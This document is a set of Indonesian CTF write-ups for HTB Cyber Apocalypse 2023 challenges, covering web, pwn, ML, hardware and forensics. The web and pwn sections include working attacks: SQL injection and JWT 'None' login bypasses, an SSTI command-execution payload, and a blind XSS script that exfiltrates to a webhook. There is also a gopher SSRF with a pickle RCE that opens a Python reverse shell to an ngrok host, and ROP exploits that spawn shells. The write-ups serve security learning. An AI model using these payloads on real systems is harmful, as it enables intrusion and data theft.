# HTB 2023

# **passman - web**

Tag: (GraphQL)

## **Recon**

Saat melihat source code pada challenge kita akan menemukan endpoint `/graphql` pada `/routes/index.js`

```js
router.use('/graphql', AuthMiddleware, graphqlHTTP({
    schema: GraphqlSchema,
    graphiql: false
}));

```

Dan saat kita masuk ke directory `/helpers/GraphqlHelper.js` kita akan menemukan fungsi mutation `UpdatePassword`.

```js
        UpdatePassword: {
            type: ResponseType,
            args: {
                username: { type: new GraphQLNonNull(GraphQLString) },
                password: { type: new GraphQLNonNull(GraphQLString) }
            },
            resolve: async (root, args, request) => {
                return new Promise((resolve, reject) => {
                    if (!request.user) return reject(new GraphQLError('Authentication required!'));

                    db.updatePassword(args.username, args.password)
                        .then(() => resolve(response("Password updated successfully!")))
                        .catch(err => reject(new GraphQLError(err)));
                });
            }
        },

```

Fungsi ini akan mengupdate password berdasarkan usernamenya. Kita bisa lihat detailnya pada `/database.js`

```js
    async updatePassword(username, password) {
        return new Promise(async (resolve, reject) => {
            let stmt = `UPDATE users SET password = ? WHERE username = ?`;
            this.connection.query(
                stmt,
                [
                    String(password),
                    String(username)
                ],
                (err, _) => {
                    if(err)
                        reject(err)
                    resolve();
			    }
            )
        });
    }

```

## **Exploit**

Jadi untuk melakukan exploitasi kita harus merubah password dari akun admin, dapat kita lihat di `entrypoint.sh`

```js
...snip...
INSERT INTO passman.users (username, password, email, is_admin)
VALUES
    ('admin', '$(genPass)', 'admin@passman.htb', 1),
    ('louisbarnett', '$(genPass)', 'louis_p_barnett@mailinator.com', 0),
    ('ninaviola', '$(genPass)', 'ninaviola57331@mailinator.com', 0),
    ('alvinfisher', '$(genPass)', 'alvinfisher1979@mailinator.com', 0);
...snip...

```

Ingat kita perlu register dan login terlebih dahulu dikarenakan fungsi `UpdatePassword` hanya bisa dilakukan ketika kita sudah login.

![https://i.imgur.com/MNzs4xd.png](https://i.imgur.com/MNzs4xd.png)

![https://i.imgur.com/uN6Gc8x.png](https://i.imgur.com/uN6Gc8x.png)

Sekarang kita perlu melakukan mutation berikut untuk mengganti password dari admin menjadi foo.

```gql
mutation { UpdatePassword(username:"admin",password:"foo") { message } }
```

![https://i.imgur.com/Bi9l9EZ.png](https://i.imgur.com/Bi9l9EZ.png)

Kita login menggunakan akun admin menggunakan password `foo`

![https://i.imgur.com/m9Jn0o3.png](https://i.imgur.com/m9Jn0o3.png)

Dan kita akan mendapatkan flagnya di bagian password.

![https://i.imgur.com/Diadr73.png](https://i.imgur.com/Diadr73.png)

# **Orbital - web**

Tag: (Union SQL Injection, LFI)

## **Bypass Admin Login**

Pertama kita harus membypass login page berikut, untuk mendapat akses ke fungsi web lainnya.

![https://i.imgur.com/MZbvAEi.png](https://i.imgur.com/MZbvAEi.png)

Saat kita melihat source code pada challenge ini, kita akan mendapatkan SQL injection pada fungsi `login()` pada file `/challenge/application/database.py`

```python
def login(username, password):
    # I don't think it's not possible to bypass login because I'm verifying the password later.
    user = query(f'SELECT username, password FROM users WHERE username = "{username}"', one=True)
    ...snip...

```

Fungsi ini akan dipanggil saat kita mengunjungi endpoint `/login` dengan `POST` request.

```python
@api.route('/login', methods=['POST'])
def apiLogin():
    if not request.is_json:
        return response('Invalid JSON!'), 400

    data = request.get_json()
    username = data.get('username', '')
    password = data.get('password', '')

    if not username or not password:
        return response('All fields are required!'), 401

    user = login(username, password)

    if user:
        session['auth'] = user
        return response('Success'), 200

    return response('Invalid credentials!'), 403

```

Sekarang mari kita eksploitasi SQL Injection tersebut untuk membypass login page.

Pertama kita perlu mengintercept post request dari login page dan merubah json requestnya menjadi seperti ini.

```json
{"username":"foo\" UNION SELECT 'admin', '7815696ecbf1c96e6894b779456d330e';-- -","password":"asd"}

```

![https://i.imgur.com/BVFEfRz.png](https://i.imgur.com/BVFEfRz.png)

Sedikit penjelasan bahwa `7815696ecbf1c96e6894b779456d330e` adalah md5 dari `asd`, ini dilakukan karna fungsi `passwordVerify()` akan mem-verifikasi dengan mencocokan md5 dari `password` yang kita inputkan di post request dengan md5 dari database, dan karna itu saya menggunakan SQL query UNION untuk mengubah output yang dikeluarkan dari database tersebut.

`database.py`

```python
...snip...
        passwordCheck = passwordVerify(user['password'], password)
...snip...

```

`util.py`

```python
def passwordVerify(hashPassword, password):
    md5Hash = hashlib.md5(password.encode())

    if md5Hash.hexdigest() == hashPassword: return True
    else: return False

```

Setelah kita mengirimkan request tersebut, kita akan dialihkan ke halaman utama web seperti berikut.

![https://i.imgur.com/9oI7jCj.png](https://i.imgur.com/9oI7jCj.png)

## **Local File Inclusion**

Saat melihat ke file `routes.py` kita akan menemukan endpoint yang vulnerable dengan LFI

```python
@api.route('/export', methods=['POST'])
@isAuthenticated
def exportFile():
...snip...
    try:
        # Everyone is saying I should escape specific characters in the filename. I don't know why.
        return send_file(f'/communications/{communicationName}', as_attachment=True)
...snip...

```

```python
...snip...
COPY flag.txt /signal_sleuth_firmware
COPY files /communications/
...snip...

```

Karna kita tahu bahwa flag.txt terdapat di `/signal_sleuth_firmware`, sekarang kita perlu untuk lfi ke file tersebut untuk membaca flagnya.

Kita lakukan request seperti dibawah dan kita akan mendapatkan flagnya.

![https://i.imgur.com/YdhfLfd.png](https://i.imgur.com/YdhfLfd.png)

# **Didactic Octo Paddles - web**

Tag: (JWT None Algorithm, SSTI)

## **Bypass Admin Login**

Saat kita melihat source code pada `/middleware/AdminMidleware.js` kita akan melihat bahwa kode tersebut vulnerable dengan [JWT None Algorithm Attack](https://blog.pentesteracademy.com/hacking-jwt-tokens-the-none-algorithm-67c14bb15771).

```python
...snip...
const decoded = jwt.decode(sessionCookie, { complete: true });

        if (decoded.header.alg == 'none') {
            return res.redirect("/login");
        } else if (decoded.header.alg == "HS256") {
            const user = jwt.verify(sessionCookie, tokenKey, {
                algorithms: [decoded.header.alg],
            });
...snip...
        } else {
            const user = jwt.verify(sessionCookie, null, {
                algorithms: [decoded.header.alg],
            });
...anip...

```

Jika algoritma yang digunakan adalah `none` maka akan terfilter dan kita dibwa ke login page, disini kita bisa membypass if statement tersebut menggunkan huruf besar `None`.

Pertama kita perlu mendapatkan JWT cookie dengan register ke endpoint `/register` dan login di endpoint `/login`, setelah itu kita akan mendapatkan cookie pada browser kita seperti ini.

![https://i.imgur.com/6fZLMDF.png](https://i.imgur.com/6fZLMDF.png)

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiaWF0IjoxNjc5NTcwMjYzLCJleHAiOjE2Nzk1NzM4NjN9.TZ5vS0bvOpFx0rHMuUYhs7fcC5etfebyUkBaxMbKoBs

```

Setelah itu kita masukkan cookie ke cyber-chef seperti ini atau decoder lainnya, lalu rubah algorithmnya menjadi `None` sehingga nanti hasilnya menjadi seperti ini

![https://i.imgur.com/y9Ztrt1.png](https://i.imgur.com/y9Ztrt1.png)

Setelah itu kita bisa mengakses endpoint `/admin` dengan cookie yang kita forge tersebut.

![https://i.imgur.com/vAwp7rZ.png](https://i.imgur.com/vAwp7rZ.png)

## **Exploiting SSTI**

pada endpoint `/admin` kita akan melihat vulnerability SSTI seperti berikut.

`routers/index.js`

```js
    router.get("/admin", AdminMiddleware, async (req, res) => {
        try {
            const users = await db.Users.findAll();
            const usernames = users.map((user) => user.username);

            res.render("admin", {
                users: jsrender.templates(`${usernames}`).render(), // SSTI
            });

```

Vulnerability ini bisa kita trigger dengan membuat user baru.

Saya membuat user dengan username sebagai berikut.

![https://i.imgur.com/tNxxiei.png](https://i.imgur.com/tNxxiei.png)

```
{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt').toString()")()}}

```

Setelah kita register, kita akan mendapatkan flagnya di endpoint `/admin`

![https://i.imgur.com/ezS6SZV.png](https://i.imgur.com/ezS6SZV.png)

# **SpyBug - web**

Tag: (Blind XSS, script-src 'self' XSS bypass with file upload)

## **Recon**

Pertama yang perlu kita ketahui adalah terdapatnya bot dalam challenge ini yang akan menuju halaman utama website dengan akun admin dalam beberapa detik sekali. Source code bot tersebut bisa dilihat di `/utils/adminbot.js`

Pada challenge ini kita tidak dapat mengakses halaman utama web dikarenakan diperlukannya authentifikasi, tetapi kita dapat mengakses endpoint-endpoint pada `/routes/agents.js`.

Di halaman utama terdapat flag dan juga XSS yang kita bisa manfaatkan, tetapi terdapat CSP yang lumayan strict berikut ini:

`index.js`

```js
application.use((req, res, next) => {
  res.setHeader("Content-Security-Policy", "script-src 'self'; frame-ancestors 'none'; object-src 'none'; base-uri 'none';");
  res.setHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  res.setHeader("Pragma", "no-cache");
  res.setHeader("Expires", "0");
  next();
});

```

Terdapat CSP `script-src 'self'` yang berarti kita hanya bisa mengimport script dari website tersebut, disini kita perlu melakukan file upload untuk menyematkan javascript untuk kita melakukan XSS.

`/routes/agents.js`

```js
router.post(
  "/agents/upload/:identifier/:token",
  authAgent,
  multerUpload.single("recording"),
  async (req, res) => {
    if (!req.file) return res.sendStatus(400);

    const filepath = path.join("./uploads/", req.file.filename);
    const buffer = fs.readFileSync(filepath).toString("hex");

    if (!buffer.match(/52494646[a-z0-9]{8}57415645/g)) {
      fs.unlinkSync(filepath);
      return res.sendStatus(400);
    }

    await createRecording(req.params.identifier, req.file.filename);
    res.send(req.file.filename);
  }
);

```

Pada source code diatas kita bisa melihat adanya file upload, tetapi ada restriksi pada if statement kedua, ini bisa kita bypass dengan menambahkan `RIFF....WAVE` pada payload js kita.

## **Exploit**

Jadi hal yang perlu kita lakukan adalah:

- Register agent.
- Upload file dan bypass file upload restriction serta tidak lupa menyisipkan script untuk membaca flag di home page dan mengirimkannya ke webhook.
- Menyisipkan XSS link payload kita didalam `hostname`, `platform`, atau `arch` pada agent.

Solve script:

```python
import requests
from pwn import log, context

context.log_level = "INFO"
URL = "http://165.232.108.240:30948"
BOT_URL = "http://0.0.0.0:1337"

class API:
    def __init__(self, agentId=None, token=None, url=URL):
        self.url = url
        self.agentId = agentId
        self.agentToken = token
    def register(self):
        res = requests.get(self.url+"/agents/register")
        json = res.json()
        log.info("register agent: %s", json)
        self.agentId = json["identifier"]
        self.agentToken = json["token"]
    def details(self, hostname, platform, arch):
        res = requests.post(
            self.url+"/agents/details/{identifier}/{token}".format(identifier=self.agentId, token=self.agentToken),
            data={
                "hostname": hostname,
                "platform": platform,
                "arch": arch,
            },
        )
        log.info("agents details: %s", res.text)
        return res.text
    def upload(self, payload):
        res = requests.post(
            self.url+"/agents/upload/{identifier}/{token}".format(identifier=self.agentId, token=self.agentToken),
            files={"recording":("test.wav", "//RIFF....WAVE\n"+payload, "audio/wave")},
        )
        log.info("upload: %s", res.text)
        return res.text

a = API()
a.register()
script = a.upload("fetch('https://webhook?'+document.querySelector('h2').innerHTML)")
a.details(f"<script src='{BOT_URL}/uploads/{script}'></script>", "windows","windows")

```

Jalankan script tersebut dan kita akan mendapatkan flag di webhook yang sudah kita set.

![https://i.imgur.com/w1M9Acd.png](https://i.imgur.com/w1M9Acd.png)

# **TrapTrack**

Tag: (SSRF With gopher protocol, Python Pickle Deserialization To RCE)

Untuk challenge ini kita bisa memanfaatkan vulnerability di pycurl dengan menggunakan protocol `gopher://` untuk membuat raw request ke internal redis server, vulnerability ini bisa kita dapatkan di source code pad file `/worker/healthcheck.py`, untuk lebih lengkapnya tentang vulnerability ini bisa dilihat di link berikut [link](https://infosecwriteups.com/exploiting-redis-through-ssrf-attack-be625682461b).

Setelah itu kita bisa membuat `worker` palsu dan mentrigger pickle load pada fungsi `get_work_item()` pada file `/worker/main.py` memanfaatkan python pickle yang digunakan pada service untuk melakukan RCE.

Berikut solve script yang saya gunakan untuk menyelesaikan challenge ini.

```python
import requests
from base64 import b64encode

SESSION = {"session": "77031d23-0eb7-4502-98bd-7a6b93cacecc"}
URL="http://165.227.224.40:31590"

def add_track(payload, url=URL):
   res = requests.post(url+"/api/tracks/add", cookies=SESSION, json={
       "trapName": "foo",
       "trapURL": payload,
   })
   return res.text

import pickle

def job_status(trackid, url=URL):
   res = requests.get(url+f"/api/tracks/{trackid}/status", cookies=SESSION)
   return res.text

class PickleRCE(object):
   def __reduce__(self):
       import os
       return (os.system,(command,))

connect = ("0.tcp.ap.ngrok.io", 13672)
command = f"""python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("%s",%s));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'""" % connect

a = pickle.dumps(PickleRCE())
b = b64encode(a).decode()
print(add_track("gopher://127.0.0.1:6379/_HSET%20jobs%20200%20"+b+"%0A"))
print(job_status("200"))

```

![https://i.imgur.com/pKVFay4.png](https://i.imgur.com/pKVFay4.png)

# Reconfiguration - ML

diberikan dataset bernama point.csv dan file analysis.ows yang berisi clue untuk menampilkan visualisasi scatter plot pada dataset yang diberikan.

![https://cdn.discordapp.com/attachments/1085884758174728202/1088469777514766437/image.png](https://cdn.discordapp.com/attachments/1085884758174728202/1088469777514766437/image.png)

![https://cdn.discordapp.com/attachments/1085884758174728202/1088469807625670726/image.png](https://cdn.discordapp.com/attachments/1085884758174728202/1088469807625670726/image.png)

# Mysterious Learnings - ML

diberikan file bernama alien.h5 yang merupakan file format untuk menyimpan struktur data. file ini biasanya merupakan hasil simpanan model dari library keras. untuk mendapatkan flag dapat dengan melihat summary model nya dan lakukan decode base64.

![https://cdn.discordapp.com/attachments/1085884758174728202/1088471130723078164/image.png](https://cdn.discordapp.com/attachments/1085884758174728202/1088471130723078164/image.png)

![https://cdn.discordapp.com/attachments/1085884758174728202/1088471412060192799/image.png](https://cdn.discordapp.com/attachments/1085884758174728202/1088471412060192799/image.png)

# void - PWN

program yang hanya menerima input dengan fungsi read dengan size lebih besar dari buffer (bof) tetapi tidak ditemukan pop rax & syscall gadget sehingga saya tidak bisa membuat payload untuk memanggil syscall excve, satu"nya yang terpikirkan adalah partial overwrite address libc yang ada di stack dengan one_gadget

![https://cdn.discordapp.com/attachments/1085884758174728202/1088474739133124628/wu.png](https://cdn.discordapp.com/attachments/1085884758174728202/1088474739133124628/wu.png)

saya menggunakan address libc kedua dikarenakan constraint dari one_gadget r12 dan r13 harus null dan gadget pop r12 yang ditemukan adalah gadget csu, sehingga alamat libc pertama akan masuk ke salah satu register

1. perlu diketahui juga bahwa alamat one_gadget berbeda 3 byte dengan alamat libc yang ada di stack sehingga dalam solusi ini diperlukan bruteforce aslr 3 nible (karena 3 nible belakang selalu sama), berikut script yang digunakan

```python
#!/usr/bin/env python3

from pwn import *

exe = 'void'
elf = context.binary = ELF(exe, checksec=False)
libc = ELF('glibc/libc.so.6', checksec=False)
context.log_level = 'error'

cmd = '''
bp 0x401142
'''

# if args.REMOTE:
#     p = remote('165.227.224.40', 31165)
# else:
#     p = process()

### EXPLOIT HERE ###

# gdb.attach(p, cmd)
pop_r12_chain = 0x00000000004011b4
ret = 0x4011bc
target = 0x61a

while True:
    payload = flat(
        b'a'* 72,
        pop_r12_chain,
        0x00,
        0x00,
        0x00,
        0x00,
        ret,
        ret,
        ret
    )
    target += 0x1000
    if target >= 0xfff61a:
        target = 0x61a
    payload += p64(target)[:3]
    try:
        p = remote('165.227.224.40', 31165)
        p.send(payload)
        p.sendline(b'ls')
        print(p.recvline(timeout=1))
        p.sendline(b'cat flag.txt')
        print(p.recvline(timeout=1))
        p.interactive()
    except EOFError:
        p.close()
        continue
    except BrokenPipeError:
        p.close()
        continue

# solved with brute force 74f61a idk if the aslr machine was on or off
```

note : untuk void setelah lihat orang lain nampaknya solver saya kena aslr itu hoki

# pandoras box - PWN

bug yang sama yaitu bof, namun disini kita bisa melakukan leak alamat libc dengan puts dan kembali lagi untuk input payload kedua, namun perlu diperhatikan bahwa alamat fungsi main (lupa) memanggila fungsi lain yang berfungsi untuk clear terminal sehingga kita tidak akan bisa melihat hasil leak dari puts, untuk menghadapi hal tersebut kita cukup untuk meloncati fungsi tersebut berikut solver saya

```python
#!/usr/bin/env python3

from pwn import *

exe = 'pb'
elf = context.binary = ELF(exe, checksec=False)
libc = ELF('glibc/libc.so.6', checksec=False)
context.log_level = 'debug'

cmd = '''
bp box
'''

if args.REMOTE:
    p = remote('206.189.112.129', 31648)
else:
    p = process()

### EXPLOIT HERE ###

got = elf.got.puts
puts = elf.symbols.puts
ret = 0x0000000000401016
pop_rdi = 0x000000000040142b
box = elf.symbols.box
# gdb.attach(p)

payload = flat(
    b'a'*56,
    pop_rdi,
    got,
    puts, 
    box
)
p.sendline(b'2')
p.sendline(payload)

p.recvuntil(b'We will deliver the mythical box to the Library for analysis, thank you!\n\n')
libc.address = u64(p.recvline(0).ljust(8, b'\x00')) - libc.symbols.puts
print(hex(libc.address))
print(hex(next(libc.search(b'/bin/sh'))))
print(hex(libc.symbols.system))

payload = flat(
    b'a'*56,
    pop_rdi,
    next(libc.search(b'/bin/sh')),
    ret,
    libc.symbols.system
)
p.sendline(b'2')
# input()
p.sendlineafter(b'Insert location of the library: ', payload)

p.interactive()
```

# Last Hope - ML

diberikan file bernama quantum_artifact.qasm yang merupakan script file Quantum Assembly Language. untuk mendapatkan flag dapat dengan mencompile script tersebut menggunakan qasm simulator. lalu hasil dari compile dapat dilakukan decode binary string.

![https://media.discordapp.net/attachments/1085884758174728202/1088479872822804530/image.png?width=720&height=270](https://media.discordapp.net/attachments/1085884758174728202/1088479872822804530/image.png?width=720&height=270)

![https://media.discordapp.net/attachments/1085884758174728202/1088479967496650752/image.png](https://media.discordapp.net/attachments/1085884758174728202/1088479967496650752/image.png)

# Timed Transmission - Hardware

diberikan file bernama Captured_Signals.sal yang merupakan file yang berisi tangkapan sinyal. file ini dapat kita buka menggunakan software Logic Analyzer Saleae.

![https://media.discordapp.net/attachments/1085884758174728202/1088480676002676756/image.png?width=720&height=355](https://media.discordapp.net/attachments/1085884758174728202/1088480676002676756/image.png?width=720&height=355)

# Debug - Hardware

diberikan file .sal dan lalu langsung saja dibuka dengan software Logic Analyzer Saleae.

![https://cdn.discordapp.com/attachments/1085884758174728202/1088485121453207562/image.png](https://cdn.discordapp.com/attachments/1085884758174728202/1088485121453207562/image.png)

setelah sedikit riset, ternyata sinyal tersebut merupakan hasil dari komunikasi Tx/Rx UART. Lalu, untuk mendapatkan datanya kita dapat tambahkan Async Serial Analyzer pada channel 02 yaitu RX. Lalu setelah itu datanya dapat kita export dalam bentuk csv.

![https://cdn.discordapp.com/attachments/1085884758174728202/1088486635559194795/image.png](https://cdn.discordapp.com/attachments/1085884758174728202/1088486635559194795/image.png)

# Roten - Forensic

diberikan file .pcap yang mana didalam nya terdapat traffic percobaan melakukan upload file php. langsung saja kita extract file php nya.

![https://cdn.discordapp.com/attachments/1085884758174728202/1088488109638955088/image.png](https://cdn.discordapp.com/attachments/1085884758174728202/1088488109638955088/image.png)

![https://cdn.discordapp.com/attachments/1085884758174728202/1088488393345872012/image.png](https://cdn.discordapp.com/attachments/1085884758174728202/1088488393345872012/image.png)

ketika di run akan muncul error pada function eval, lalu untuk itu saya mencoba mengakalinya dengan menggantinya menjadi echo

![https://cdn.discordapp.com/attachments/1085884758174728202/1088489052719812648/image.png](https://cdn.discordapp.com/attachments/1085884758174728202/1088489052719812648/image.png)

setelah diganti menjadi echo, maka akan muncul hasil run tanpa error

![https://cdn.discordapp.com/attachments/1085884758174728202/1088489214615748708/image.png](https://cdn.discordapp.com/attachments/1085884758174728202/1088489214615748708/image.png)

# Extraterrestrial Persistence - Forensic

diberikan file .sh yang mana didalam nya script bash. lalu pada line 10 terdapat kode base64 dan langsung di decode saja.

![https://cdn.discordapp.com/attachments/1085884758174728202/1088490086036934686/image.png](https://cdn.discordapp.com/attachments/1085884758174728202/1088490086036934686/image.png)

![https://cdn.discordapp.com/attachments/1085884758174728202/1088490142966239252/image.png](https://cdn.discordapp.com/attachments/1085884758174728202/1088490142966239252/image.png)

# Our Community Member Write Up

1. Daffainfo [https://github.com/daffainfo/ctf-writeup/tree/main/Cyber Apocalypse 2023 The Cursed Mission](https://github.com/daffainfo/ctf-writeup/tree/main/Cyber%20Apocalypse%202023%20The%20Cursed%20Mission)
    
    List:
    
    1. Alien Cradle
    2. Ancient Encodings
    3. Critical Flight
    4. Hijack
    5. Persistance
    6. Plaintext Treasure
    7. Restricted
    8. Small Steps
    9. Trapped Source
    10. nehebkaus trap
2. Kaelanalysis [https://github.com/maulvialf/CTF-Writeups/tree/main/2023/htb-apocalypse-2023/](https://github.com/maulvialf/CTF-Writeups/tree/main/2023/htb-apocalypse-2023/)
    
    List: 
    
    ##Rev
    
    1. Cshells
    2. Hunting License
    3. Shattered Table
    4. Neddle Haystack
    5. Cavesystem
    6. Alien Saboteur
    7. Somewhat Linear
    8. Gimmick DSP
    9. Vessel Cartographer
    10. Analogue Signal Processing
    
    ##ML
    
    1. Reading the stars
    2. Vision chip
    
    ##Pwn
    
    1. Void
    
    ##Misc
    
    1. Janken
    2. Calibrator